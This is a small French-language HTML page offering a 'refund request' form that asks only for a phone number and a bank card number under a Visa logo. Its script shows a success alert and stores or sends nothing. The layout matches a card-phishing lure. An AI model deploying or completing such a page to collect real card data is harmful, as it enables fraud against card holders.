<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Demande de remboursement</title>
<style>
  body, html {
    margin: 0; padding: 0; height: 100%;
    font-family: Arial, sans-serif;
    background: #f5f5f5;
  }
  .container {
    max-width: 400px;
    margin: 40px auto;
    background: white;
    padding: 20px 30px 30px;
    border-radius: 8px;
    box-shadow: 0 3px 10px rgba(0,0,0,0.1);
  }
  h1 {
    text-align: center;
    margin-bottom: 25px;
    font-weight: 700;
    color: #333;
  }
  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    color: #555;
  }
  input[type="text"],
  input[type="tel"] {
    width: 100%;
    padding: 12px 40px 12px 12px; /* espace à droite pour le logo carte */
    font-size: 16px;
    border: 1.5px solid #ccc;
    border-radius: 6px;
    box-sizing: border-box;
  }
  .card-input-wrapper {
    position: relative;
  }
  .card-input-wrapper img {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    width: 24px;
    height: 24px;
    pointer-events: none;
  }
  button {
    margin-top: 25px;
    width: 100%;
    background-color: #2979ff;
    color: white;
    font-size: 18px;
    padding: 14px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
  }
  button:hover {
    background-color: #1565c0;
  }
</style>
</head>
<body>

<div class="container">
  <h1>Demande de remboursement</h1>
  
  <form id="remboursementForm">
    <label for="phone">Numéro de téléphone</label>
    <input type="tel" id="phone" name="phone" placeholder="06 12 34 56 78" required pattern="[0-9\s+()-]{6,}" />
    
    <label for="cardNumber">N° de carte</label>
    <div class="card-input-wrapper">
      <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19" />
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Carte bancaire" />
    </div>
    
    <button type="submit">Confirmer</button>
  </form>
</div>

<script>
  const form = document.getElementById('remboursementForm');
  form.addEventListener('submit', function(event) {
    event.preventDefault();
    alert('Demande de remboursement effectué avec succès');
    form.reset();
  });
</script>

</body>
</html>
